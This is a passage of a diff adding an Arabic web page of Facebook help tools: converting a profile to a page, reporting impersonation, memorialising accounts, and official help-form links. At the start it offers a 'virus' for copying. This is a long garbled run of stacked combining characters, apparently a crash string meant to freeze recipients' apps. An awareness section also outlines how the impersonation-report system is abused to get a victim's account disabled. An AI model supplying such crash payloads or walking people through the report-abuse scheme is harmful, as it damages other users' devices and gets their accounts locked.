+.li*▇▇▏╱▔▕▎▔▔╲▕▇▇*li. 
+.li*▇▇◣◣▃▅▎▅▃◢◢▇▇*li. 
+.li*▇▇▇◣◥▅▅▅◤◢▇▇▇*li. 
+.li*▇▇▇▇◣╲▇╱◢▇▇▇▇*li. 
+.li执㝧执瑩浻牡楧㩮㔱硰执㝧执獧 ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎­๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎­๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎­๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎­๎๎๎๎๎๎๎๎ํํํํํํํํํํํํ­ํํํํํํํํํํํํํํํํํํํํ­ํํํํํํํํํํํํํํํํ ค้้้้้้้้้้้้้้้้้้้­้้้้้้้้้้้้้้้้้้้้­้้้้้้้้้้้้้้้้้้้้­้้้้้้้้้้้้้้้้้้้้­้้้้้้้้้้้้้้้ ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎­๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎­๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎­๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎­๎๎๎๎๎๎๎๎ํํํํํํํํํํํํ­ํํํํํํํํํํํํํํํํํํํํ­ํํํํํํํํํํํํํํํํ ค้­้­้­้­้คฏ๎­๎­๎­๎­๎­ํ­ํค้้้้้้้้้้้้้้้้้้้­้้้้้้้้้้้้้้้้้้้้­้้้้้้้้้้้้้้้้้้้้­้้้้้้้้้้้้้้้้้้้้­้้้้้้้้้้้้้้้ ฏ๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎­๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎­๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎­๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎๎­๎๎๎๎๎๎๎๎ํํํํํํํ敷止瑩 Y6S╋߷⃒⃓⃑⃔⃕⃖⃛⃜⃝۝۞۩߷⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠۝۞۩߷⃒⃓⃑⃔⃕⃖⃛⃜⃝۝۞۩߷⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠۝۞۩߷⃒⃓⃑⃔⃕⃖⃛⃜⃝۝۞۩߷⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠۝۞۩߷⃒⃓⃑⃔⃕⃖⃛⃜⃝۝۞۩߷⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠⃒⃓⃑⃔⃕⃖⃛⃜⃝⃠۝۞۩߷⃒⃓⃑⃔⃕⃖⃛⃜⃝۝۞۩߷⃒⃓⃑⃔▇ of</textarea><button class="copy-btn" onclick="copyToClipboard(document.getElementById('virus-code'))">نسخ الفايروس</button></div>`;
+                    break;
+                case 'migrate_to_page':
+                    container = document.getElementById('migrate_to_page-output');
+                    container.innerHTML = `<h2>تحويل حسابك الشخصي إلى صفحة فيسبوك</h2><p>إذا كنت ترغب في تحويل حسابك الشخصي إلى صفحة عامة (Page) للاستفادة من مزايا الصفحات، يمكنك ذلك.</p><div class="step"><h3>ماذا يحدث عند التحويل؟</h3><ul><li>يتم نقل صورة ملفك الشخصي وصورة الغلاف واسمك إلى الصفحة الجديدة.</li><li>
+أصدقاؤك تلقائيًا إلى "معجبين" بالصفحة.</li><li>يبقى حسابك الشخصي موجودًا، وتصبح أنت مدير الصفحة الجديدة.</li></ul></div><div class="step"><h3>رابط التحويل</h3><p>اذهب إلى الرابط التالي لبدء عملية التحويل:</p><p style="text-align:center;"><a href="https://www.facebook.com/pages/create/migrate" target="_blank">بدء تحويل الحساب إلى صفحة</a></p></div><div class="warning"><strong>مهم:</strong> هذه العملية لا يمكن التراجع عنها. تأكد من أنك تريد بالفعل إنشاء صفحة من حسابك.</div>`;
+                    break;
+                case 'report_impersonation':
+                    container = document.getElementById('report_impersonation-output');
+                    container.innerHTML = `<h2>الإبلاغ عن حساب ينتحل شخصيتك</h2><p>إذا وجدت حسابًا يستخدم صورك واسمك وينتحل شخصيتك، يجب الإبلاغ عنه فورًا.</p><div class="step"><h3>الخطوات</h3><ol><li>اذهب إلى الحساب المنتحل.</li><li>اضغط على الثلاث نقاط (...) الموجودة تحت صورة الغلاف.</li><li>اختر <strong>"بحث عن دعم أو إبلاغ" (Find Support or Report Profile)</strong>.</li><li>اختر <strong>"انتحال شخصية" (Pretending to Be Someone)</strong>.</li><li>اختر <strong>"أنا" (Me)</strong> إذا كان الحساب ينتحلك، أو "صديق" إذا كان ينتحل شخصية صديق لك.</li><li>اتبع التعليمات الإضافية التي يطلبها فيسبوك.</li></ol></div><p>إذا لم يكن لديك حساب فيسبوك، يمكنك الإبلاغ من خلال <a href="https://www.facebook.com/help/contact/295309487309948" target="_blank">هذا النموذج</a>.</p>`;
+                    break;
+                case 'memorialize_account':
+                    container = document.getElementById('memorialize_account-output');
+                    container.innerHTML = `<h2>طلب إحياء ذكرى حساب شخص متوفى</h2><p>يمكنك طلب تحويل حساب شخص متوفى إلى حساب في ذكرى (Memorialized Account). هذا يحمي الحساب من تسجيل الدخول ويضيف كلمة "في ذكرى" بجانب اسم الشخص.</p><div class="step"><h3>كيفية الطلب</h3><p>يجب عليك ملء نموذج خاص وتقديم إثبات للوفاة (مثل رابط لنعي أو شهادة وفاة).</p><p>استخدم الرابط التالي لتقديم طلبك:</p><p style="text-align:center;"><a href="https://www.facebook.com/help/contact/651319028315841" target="_blank">نموذج طلب إحياء الذكرى</a></p></div><p>يمكنك أيضًا طلب إزالة الحساب نهائيًا إذا كنت فردًا من أفراد العائلة المباشرين.</p>`;
+                    break;
+                case 'identity_exploit_warning':
+                    container = document.getElementById('identity_exploit_warning-output');
+                    container.innerHTML = `<h2 style="color: #d32f2f;">تحذير: ثغرة تأكيد الهوية</h2><p class="warning"><strong>هذا القسم للتوعية والحماية فقط، وليس لشرح كيفية تنفيذ الهجوم.</strong></p><p>يستغل بعض الأشخاص نظام الإبلاغ في فيسبوك للإضرار بالآخرين عبر ما يسمى "ثغرة تأكيد الهوية".</p><div class="step"><h3>كيف تعمل الثغرة؟</h3><ol><li>يقوم المهاجم بإنشاء حساب جديد باسم شخصية مشهورة أو علامة تجارية.</li><li>يغير معلومات حسابه (الصورة، الغلاف، إلخ) لتطابق حساب الضحية تمامًا.</li><li>يبلغ المهاجم عن حساب الضحية مدعيًا أن الضحية هو من ينتحل شخصيته (شخصية المهاجم المزيفة).</li><li>يقوم فيسبوك آليًا بتعطيل حساب الضحية ويطلب منه تأكيد هويته، وهي عملية قد تكون صعبة وتستغرق وقتًا.</li></ol></div><div class="step"><h3>كيف تحمي نفسك؟</h3><ul><li><strong>قفل الملف الشخصي:</strong> يمنع الغرباء من رؤية صورك ومعلوماتك ونسخها.</li><li><strong>تفعيل المصادقة الثنائية:</strong> تضيف طبقة أمان قوية لحسابك.</li><li><strong>لا تقبل طلبات صداقة من غرباء:</strong> قلل من الأشخاص الذين يمكنهم الوصول لملفك الشخصي.</li></ul></div>`;
+                    break;
+                case 'important_links':
+    container = document.getElementById('important_links-output');
+    container.innerHTML = `
+        <h2>روابط ونماذج هامة</h2>
+        <p>قائمة بالروابط المباشرة لصفحات ونماذج مهمة في فيسبوك قد تحتاجها لحل مشاكلك.</p>
+        
+        <div class="step">
+            <h3>رابط حذف حساب فيسبوك نهائياً</h3>
+            <p>يستخدم لحذف حسابك بشكل دائم ولا يمكن التراجع عنه.</p>
+            <textarea readonly>https://m.facebook.com/help/delete_account</textarea>
+            <button class="copy-btn" onclick="copyToClipboard(this.previousElementSibling)">نسخ الرابط</button>
+        </div>
+
+        <div class="step" style="clear:both; padding-top:10px;">
+            <h3>رابط الإبلاغ عن شخص متوفى</h3>
+            <p>لطلب تحويل حساب شخص متوفى إلى حساب في ذكرى أو حذفه.</p>
+            <textarea readonly>https://www.facebook.com/help/contact/191122007680088</textarea>
+            <button class="copy-btn" onclick="copyToClipboard(this.previousElementSibling)">نسخ الرابط</button>
+        </div>
+
+        <div class="step" style="clear:both; padding-top:10px;">
+            <h3>رابط الإبلاغ عن مشكلة في رقم الهاتف</h3>
+            <p>إذا كنت تواجه مشاكل في تأكيد رقم هاتفك أو استخدامه.</p>
+            <textarea readonly>https://www.facebook.com/help/contact/336570443083768</textarea>
+            <button class="copy-btn" onclick="copyToClipboard(this.previousElementSibling)">نسخ الرابط</button>
+        </div>
+
+        <div class="step" style="clear:both; padding-top:10px;">
+            <h3>رابط الإبلاغ عن سجين (لإنستغرام)</h3>
+            <p>لطلب إزالة حساب شخص مسجون (هذا الرابط خاص بإنستغرام).</p>
+            <textarea readonly>https://help.instagram.com/contact/372592039493026</textarea>
+            <button class="copy-btn" onclick="copyToClipboard(this.previousElementSibling)">نسخ الرابط</button>
+        </div>
+
+        <div class="step" style="clear:both; padding-top:10px;">
+            <h3>رابط طلب معلومات عن حساب طفل</h3>
+            <p>للآباء لطلب بيانات حساب طفلهم (تحت 13 سنة).</p>
+            <textarea readonly>https://www.facebook.com/help/contact/398036060275245</textarea>
+            <button class="copy-btn" onclick="copyToClipboard(this.previousElementSibling)">نسخ الرابط</button>
+        </div>
+
+        <div class="step" style="clear:both; padding-top:10px;">
+            <h3>رابط الإبلاغ عن مستخدم غير مؤهل</h3>
+            <p>للإبلاغ عن حسابات لأطفال تحت السن القانوني (أقل من 13 عامًا).</p>
+            <textarea readonly>https://www.facebook.com/help/contact/122145551250439</textarea>
+            <button class="copy-btn" onclick="copyToClipboard(this.previousElementSibling)">نسخ الرابط</button>
+        </div>
+    `;
+    break;
+            }
+            if(container) container.style.display = 'block';
+        }
+
+        function copyToClipboard(element) {
+            element.select();
+            element.setSelectionRange(0, 99999);
+            try {
+                document.execCommand('copy');
+                const originalBtn = event.target;
+                const originalText = originalBtn.textContent;
+                originalBtn.textContent = 'تم النسخ!';
+                setTimeout(() => { originalBtn.textContent = originalText; }, 2000);
+            } catch (err) {
+                alert('عذرًا، حدث خطأ أثناء النسخ.');
+            }
+        }
+    </script>
+</body>
+</html>
+
